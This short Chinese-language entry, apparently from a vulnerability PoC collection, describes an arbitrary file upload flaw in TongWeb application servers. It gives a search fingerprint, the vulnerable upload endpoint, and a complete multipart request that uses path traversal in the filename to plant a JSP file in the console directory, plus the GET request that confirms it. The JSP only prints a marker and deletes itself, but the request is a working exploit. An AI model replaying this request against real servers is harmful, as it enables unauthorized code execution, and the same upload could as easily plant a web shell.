# 东方通upload存在文件上传漏洞

- **系统**：东方通　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`"Server: TongWeb Server"`
- **请求**：`POST /heimdall/deploy/upload?method=upload HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8UaANmWA…`

**请求体 / payload**
```
------WebKitFormBoundary8UaANmWAgM4BqBSs
Content-Disposition: form-data; name="file"; filename="../../applications/console/css/123.jsp"
<%
out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer("ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM=")));
new java.io.File(application.getRealPath(request.getServletPath())).delete();
%>
------WebKitFormBoundary8UaANmWAgM4BqBSs--
上传定位：GET /console/css/123.jsp HTTP/1.1
```
- **预期**：200　|　—